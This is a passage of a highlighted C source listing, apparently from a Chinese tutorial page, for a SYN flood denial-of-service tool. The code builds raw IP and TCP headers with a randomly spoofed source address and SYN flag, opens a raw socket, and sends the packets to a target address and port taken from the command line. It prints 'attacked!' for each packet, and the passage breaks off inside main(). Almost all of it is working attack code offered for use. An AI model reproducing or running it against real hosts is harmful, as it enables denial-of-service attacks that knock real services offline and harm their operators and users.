</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">217
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">218
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">219
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">220
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">221
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">222
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">223
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">224
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">225
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">226
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">227
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">228
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">229
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">230
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">231
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">232
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">233
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">234
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">235
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">236
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">237
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">238
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#0f0;font-weight:bold">#include</span> <span style="color:#0f0;font-weight:bold">&lt;stdio.h&gt;</span><span style="color:#0f0;font-weight:bold">
</span></span></span><span style="display:flex;"><span><span style="color:#0f0;font-weight:bold">#include</span> <span style="color:#0f0;font-weight:bold">&lt;ctype.h&gt;</span><span style="color:#0f0;font-weight:bold">
</span></span></span><span style="display:flex;"><span><span style="color:#0f0;font-weight:bold">#include</span> <span style="color:#0f0;font-weight:bold">&lt;unistd.h&gt;</span><span style="color:#0f0;font-weight:bold">
</span></span></span><span style="display:flex;"><span><span style="color:#0f0;font-weight:bold">#include</span> <span style="color:#0f0;font-weight:bold">&lt;fcntl.h&gt;</span><span style="color:#0f0;font-weight:bold">
</span></span></span><span style="display:flex;"><span><span style="color:#0f0;font-weight:bold">#include</span> <span style="color:#0f0;font-weight:bold">&lt;signal.h&gt;</span><span style="color:#0f0;font-weight:bold">
</span></span></span><span style="display:flex;"><span><span style="color:#0f0;font-weight:bold">#include</span> <span style="color:#0f0;font-weight:bold">&lt;sys/time.h&gt;</span><span style="color:#0f0;font-weight:bold">
</span></span></span><span style="display:flex;"><span><span style="color:#0f0;font-weight:bold">#include</span> <span style="color:#0f0;font-weight:bold">&lt;sys/types.h&gt;</span><span style="color:#0f0;font-weight:bold">
</span></span></span><span style="display:flex;"><span><span style="color:#0f0;font-weight:bold">#include</span> <span style="color:#0f0;font-weight:bold">&lt;sys/socket.h&gt;</span><span style="color:#0f0;font-weight:bold">
</span></span></span><span style="display:flex;"><span><span style="color:#0f0;font-weight:bold">#include</span> <span style="color:#0f0;font-weight:bold">&lt;string.h&gt;</span><span style="color:#0f0;font-weight:bold">
</span></span></span><span style="display:flex;"><span><span style="color:#0f0;font-weight:bold">#include</span> <span style="color:#0f0;font-weight:bold">&lt;netdb.h&gt;</span><span style="color:#0f0;font-weight:bold">
</span></span></span><span style="display:flex;"><span><span style="color:#0f0;font-weight:bold">#include</span> <span style="color:#0f0;font-weight:bold">&lt;errno.h&gt;</span><span style="color:#0f0;font-weight:bold">
</span></span></span><span style="display:flex;"><span><span style="color:#0f0;font-weight:bold">#include</span> <span style="color:#0f0;font-weight:bold">&lt;stdlib.h&gt;</span><span style="color:#0f0;font-weight:bold">
</span></span></span><span style="display:flex;"><span><span style="color:#0f0;font-weight:bold">#include</span> <span style="color:#0f0;font-weight:bold">&lt;time.h&gt;</span><span style="color:#0f0;font-weight:bold">
</span></span></span><span style="display:flex;"><span><span style="color:#0f0;font-weight:bold">#include</span> <span style="color:#0f0;font-weight:bold">&lt;arpa/inet.h&gt;</span><span style="color:#0f0;font-weight:bold">
</span></span></span><span style="display:flex;"><span><span style="color:#0f0;font-weight:bold"></span>
</span></span><span style="display:flex;"><span><span style="color:#007f7f">// ip 报头
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span><span style="color:#fff;font-weight:bold">struct</span> iphdr
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">char</span>       ver_and_hdrlen;<span style="color:#007f7f">// 版本号与IP头部长度
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">char</span>       tos;           <span style="color:#007f7f">// 服务类型
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">short</span>      total_len;     <span style="color:#007f7f">// 总长度
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">short</span>      id;            <span style="color:#007f7f">// IP包ID
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">short</span>      flags;         <span style="color:#007f7f">// 标志位(包括分片偏移量)
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">char</span>       ttl;           <span style="color:#007f7f">// 生命周期
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">char</span>       protocol;      <span style="color:#007f7f">// 上层协议
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">short</span>      checksum;      <span style="color:#007f7f">// 校验和
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">int</span>        srcaddr;       <span style="color:#007f7f">// 源IP地址
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">int</span>        dstaddr;       <span style="color:#007f7f">// 目标IP地址
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>};
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#007f7f">// tcp 报头
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span><span style="color:#fff;font-weight:bold">struct</span> tcphdr
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">short</span>      sport;    <span style="color:#007f7f">// 源端口
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">short</span>      dport;    <span style="color:#007f7f">// 目标端口
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">int</span>        seq;      <span style="color:#007f7f">// 序列号
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">int</span>        ack_seq;  <span style="color:#007f7f">// 确认号
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">char</span>       len;      <span style="color:#007f7f">// 首部长度
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">char</span>       flag;     <span style="color:#007f7f">// 标志位
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">short</span>      win;      <span style="color:#007f7f">// 窗口大小
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">short</span>      checksum; <span style="color:#007f7f">// 校验和
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">short</span>      urg;      <span style="color:#007f7f">// 紧急指针
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>};
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#007f7f">//TCP的伪报头，在计算TCP的校验和时需要包含
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span><span style="color:#fff;font-weight:bold">struct</span> pseudohdr
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">int</span>        saddr; <span style="color:#007f7f">//源目的IP
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">int</span>        daddr; <span style="color:#007f7f">// 目的IP
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    <span style="color:#fff;font-weight:bold">char</span>                zeros; <span style="color:#007f7f">// 8位保留字符 一般置0
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    <span style="color:#fff;font-weight:bold">char</span>                protocol;<span style="color:#007f7f">// 协议
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">short</span>      length; <span style="color:#007f7f">// 长度
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>};
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#007f7f">// 这个是计算校验和的函数
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span><span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">short</span> <span style="color:#fff;font-weight:bold">inline</span>
</span></span><span style="display:flex;"><span>checksum(<span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">short</span> *buffer, <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">short</span> size)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">long</span> cksum = <span style="color:#ff0;font-weight:bold">0</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">while</span> (size &gt; <span style="color:#ff0;font-weight:bold">1</span>) {
</span></span><span style="display:flex;"><span>        cksum += *buffer++;
</span></span><span style="display:flex;"><span>        size  -= <span style="color:#fff;font-weight:bold">sizeof</span>(<span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">short</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">if</span> (size) {
</span></span><span style="display:flex;"><span>        cksum += *(<span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">char</span> *)buffer;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    cksum = (cksum &gt;&gt; <span style="color:#ff0;font-weight:bold">16</span>) + (cksum &amp; <span style="color:#ff0;font-weight:bold">0xffff</span>);
</span></span><span style="display:flex;"><span>    cksum += (cksum &gt;&gt; <span style="color:#ff0;font-weight:bold">16</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">return</span> (<span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">short</span> )(~cksum);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#007f7f">// 通过传入的源 IP 地址和目标 IP 地址初始化 IP 头部结构。
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span><span style="color:#fff;font-weight:bold">void</span> init_ip_header(<span style="color:#fff;font-weight:bold">struct</span> iphdr *ip, <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">int</span> srcaddr,
</span></span><span style="display:flex;"><span>                    <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">int</span> dstaddr)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">int</span> len = <span style="color:#fff;font-weight:bold">sizeof</span>(<span style="color:#fff;font-weight:bold">struct</span> iphdr) + <span style="color:#fff;font-weight:bold">sizeof</span>(<span style="color:#fff;font-weight:bold">struct</span> tcphdr);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    ip-&gt;ver_and_hdrlen = (<span style="color:#ff0;font-weight:bold">4</span>&lt;&lt;<span style="color:#ff0;font-weight:bold">4</span> | <span style="color:#fff;font-weight:bold">sizeof</span>(<span style="color:#fff;font-weight:bold">struct</span> iphdr)/<span style="color:#fff;font-weight:bold">sizeof</span>(<span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">int</span>));
</span></span><span style="display:flex;"><span>    ip-&gt;tos = <span style="color:#ff0;font-weight:bold">0</span>;
</span></span><span style="display:flex;"><span>    ip-&gt;total_len = htons(len);
</span></span><span style="display:flex;"><span>    ip-&gt;id = <span style="color:#ff0;font-weight:bold">1</span>;
</span></span><span style="display:flex;"><span>    ip-&gt;flags = <span style="color:#ff0;font-weight:bold">0x40</span>;
</span></span><span style="display:flex;"><span>    ip-&gt;ttl = <span style="color:#ff0;font-weight:bold">255</span>;
</span></span><span style="display:flex;"><span>    ip-&gt;protocol = IPPROTO_TCP;
</span></span><span style="display:flex;"><span>    ip-&gt;checksum = <span style="color:#ff0;font-weight:bold">0</span>;
</span></span><span style="display:flex;"><span>    ip-&gt;srcaddr = srcaddr; <span style="color:#007f7f">// 源IP地址
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    ip-&gt;dstaddr = dstaddr; <span style="color:#007f7f">// 目标IP地址
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#007f7f">// 初始化 tcp 包
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span><span style="color:#fff;font-weight:bold">void</span> init_tcp_header(<span style="color:#fff;font-weight:bold">struct</span> tcphdr *tcp, <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">short</span> dport)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    tcp-&gt;sport = htons(rand() % <span style="color:#ff0;font-weight:bold">16383</span> + <span style="color:#ff0;font-weight:bold">49152</span>);   <span style="color:#007f7f">// 随机生成一个端口
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    tcp-&gt;dport = htons(dport);                    <span style="color:#007f7f">// 目标端口
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    tcp-&gt;seq = htonl(rand() % <span style="color:#ff0;font-weight:bold">90000000</span> + <span style="color:#ff0;font-weight:bold">2345</span> );  <span style="color:#007f7f">// 随机生成一个初始化序列号
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    tcp-&gt;ack_seq = <span style="color:#ff0;font-weight:bold">0</span>;
</span></span><span style="display:flex;"><span>    tcp-&gt;len = (<span style="color:#fff;font-weight:bold">sizeof</span>(<span style="color:#fff;font-weight:bold">struct</span> tcphdr) / <span style="color:#ff0;font-weight:bold">4</span> &lt;&lt; <span style="color:#ff0;font-weight:bold">4</span> | <span style="color:#ff0;font-weight:bold">0</span>);
</span></span><span style="display:flex;"><span>    tcp-&gt;flag = <span style="color:#ff0;font-weight:bold">0x02</span>; <span style="color:#007f7f">// 0x02 代表 是syn 包，tcp三次连接请求的开始
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    tcp-&gt;win = htons(<span style="color:#ff0;font-weight:bold">1024</span>);
</span></span><span style="display:flex;"><span>    tcp-&gt;checksum = <span style="color:#ff0;font-weight:bold">0</span>;
</span></span><span style="display:flex;"><span>    tcp-&gt;urg = <span style="color:#ff0;font-weight:bold">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#007f7f">// 初始化 tcp 伪报头
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span><span style="color:#fff;font-weight:bold">void</span> init_pseudo_header(<span style="color:#fff;font-weight:bold">struct</span> pseudohdr *pseudo, <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">int</span> srcaddr,
</span></span><span style="display:flex;"><span>                        <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">int</span> dstaddr)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    pseudo-&gt;zeros = <span style="color:#ff0;font-weight:bold">0</span>;
</span></span><span style="display:flex;"><span>    pseudo-&gt;protocol = IPPROTO_TCP;
</span></span><span style="display:flex;"><span>    pseudo-&gt;length = htons(<span style="color:#fff;font-weight:bold">sizeof</span>(<span style="color:#fff;font-weight:bold">struct</span> tcphdr));
</span></span><span style="display:flex;"><span>    pseudo-&gt;saddr = srcaddr;
</span></span><span style="display:flex;"><span>    pseudo-&gt;daddr = dstaddr;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#007f7f">// 通过 目标IP地址 和 目标端口 生成一个 SYN包，保存到参数 packet 中，并且返回包的大小。
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span><span style="color:#fff;font-weight:bold">int</span> make_syn_packet(<span style="color:#fff;font-weight:bold">char</span> *packet, <span style="color:#fff;font-weight:bold">int</span> pkt_len, <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">int</span> daddr,
</span></span><span style="display:flex;"><span>                    <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">short</span> dport)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">char</span> buf[<span style="color:#ff0;font-weight:bold">100</span>];
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">int</span> len;
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">struct</span> iphdr ip;          <span style="color:#007f7f">//IP 头部
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    <span style="color:#fff;font-weight:bold">struct</span> tcphdr tcp;        <span style="color:#007f7f">//TCP 头部
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    <span style="color:#fff;font-weight:bold">struct</span> pseudohdr pseudo;  <span style="color:#007f7f">//TCP 伪头部
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">int</span> saddr = rand();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    len = <span style="color:#fff;font-weight:bold">sizeof</span>(ip) + <span style="color:#fff;font-weight:bold">sizeof</span>(tcp);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#007f7f">// 初始化头部信息
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    init_ip_header(&amp;ip, saddr, daddr);
</span></span><span style="display:flex;"><span>    init_tcp_header(&amp;tcp, dport);
</span></span><span style="display:flex;"><span>    init_pseudo_header(&amp;pseudo, saddr, daddr);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#007f7f">//计算IP校验和
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    ip.checksum = checksum((u_short *)&amp;ip, <span style="color:#fff;font-weight:bold">sizeof</span>(ip));
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#007f7f">// 计算TCP校验和
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    bzero(buf, <span style="color:#fff;font-weight:bold">sizeof</span>(buf));
</span></span><span style="display:flex;"><span>    memcpy(buf , &amp;pseudo, <span style="color:#fff;font-weight:bold">sizeof</span>(pseudo));           <span style="color:#007f7f">// 复制TCP伪头部
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    memcpy(buf + <span style="color:#fff;font-weight:bold">sizeof</span>(pseudo), &amp;tcp, <span style="color:#fff;font-weight:bold">sizeof</span>(tcp)); <span style="color:#007f7f">// 复制TCP头部
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    tcp.checksum = checksum((u_short *)buf, <span style="color:#fff;font-weight:bold">sizeof</span>(pseudo) + <span style="color:#fff;font-weight:bold">sizeof</span>(tcp));
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    bzero(packet, pkt_len);
</span></span><span style="display:flex;"><span>    memcpy(packet, &amp;ip, <span style="color:#fff;font-weight:bold">sizeof</span>(ip));
</span></span><span style="display:flex;"><span>    memcpy(packet + <span style="color:#fff;font-weight:bold">sizeof</span>(ip), &amp;tcp, <span style="color:#fff;font-weight:bold">sizeof</span>(tcp));
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">return</span> len;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#007f7f">// 创造原始套接字
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">int</span> make_raw_socket()
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">int</span> fd;
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">int</span> on = <span style="color:#ff0;font-weight:bold">1</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#007f7f">// 创建一个原始套接字, 指定其关注TCP协议
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">if</span> (fd == -<span style="color:#ff0;font-weight:bold">1</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">return</span> -<span style="color:#ff0;font-weight:bold">1</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#007f7f">// 设置需要手动构建IP头部
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    <span style="color:#fff;font-weight:bold">if</span> (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, (<span style="color:#fff;font-weight:bold">char</span> *)&amp;on, <span style="color:#fff;font-weight:bold">sizeof</span>(on)) &lt; <span style="color:#ff0;font-weight:bold">0</span>) {
</span></span><span style="display:flex;"><span>        close(fd);
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">return</span> -<span style="color:#ff0;font-weight:bold">1</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#007f7f">/*
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f">	在调用 socket() 函数创建套接字时，指定第二个参数为 SOCK_RAW，表示创建的套接字为原始套接字。然后调用 setsockopt() 函	  数设置 IP 头部由我们自己构建
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f">	*/</span>
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">return</span> fd;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#007f7f">// 传入原始套接字、目标IP地址和目标端口，然后通过调用 sendto() 函数向服务端发送一个 SYN包
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span><span style="color:#fff;font-weight:bold">int</span> send_syn_packet(<span style="color:#fff;font-weight:bold">int</span> sockfd, <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">int</span> addr, <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">short</span> port)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">struct</span> sockaddr_in skaddr;
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">char</span> packet[<span style="color:#ff0;font-weight:bold">256</span>];
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">int</span> pkt_len;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    bzero(&amp;skaddr, <span style="color:#fff;font-weight:bold">sizeof</span>(skaddr));
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    skaddr.sin_family = AF_INET;
</span></span><span style="display:flex;"><span>    skaddr.sin_port = htons(port); 
</span></span><span style="display:flex;"><span>    skaddr.sin_addr.s_addr = addr;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	printf(<span style="color:#0ff;font-weight:bold">&#34;%d已攻击!</span><span style="color:#0ff;font-weight:bold">\n</span><span style="color:#0ff;font-weight:bold">&#34;</span>,addr);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    pkt_len = make_syn_packet(packet, <span style="color:#ff0;font-weight:bold">256</span>, addr, port);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">return</span> sendto(sockfd, packet, pkt_len, <span style="color:#ff0;font-weight:bold">0</span>, (<span style="color:#fff;font-weight:bold">struct</span> sockaddr *)&amp;skaddr,
</span></span><span style="display:flex;"><span>                  <span style="color:#fff;font-weight:bold">sizeof</span>(<span style="color:#fff;font-weight:bold">struct</span> sockaddr));
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#007f7f">// 主函数 
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span><span style="color:#fff;font-weight:bold">int</span> main(<span style="color:#fff;font-weight:bold">int</span> argc, <span style="color:#fff;font-weight:bold">char</span> *argv[])
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">int</span> addr;
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">unsigned</span> <span style="color:#fff;font-weight:bold">short</span> port;
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">int</span> sockfd;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">if</span> (argc &lt; <span style="color:#ff0;font-weight:bold">3</span>) {
</span></span><span style="display:flex;"><span>        fprintf(stderr, <span style="color:#0ff;font-weight:bold">&#34;Usage: synflood &lt;address&gt; &lt;port&gt;</span><span style="color:#0ff;font-weight:bold">\n</span><span style="color:#0ff;font-weight:bold">&#34;</span>);
</span></span><span style="display:flex;"><span>        exit(<span style="color:#ff0;font-weight:bold">1</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#007f7f">// argv[1] 目的地址 
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    <span style="color:#007f7f">// argc[2] 目的端口
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    addr = inet_addr(argv[<span style="color:#ff0;font-weight:bold">1</span>]);
</span></span><span style="display:flex;"><span>    port = atoi(argv[<span style="color:#ff0;font-weight:bold">2</span>]);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#007f7f">// 判断端口是否 存在
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>    <span style="color:#fff;font-weight:bold">if</span> (port &lt; <span style="color:#ff0;font-weight:bold">0</span> || port &gt; <span style="color:#ff0;font-weight:bold">65535</span>) {
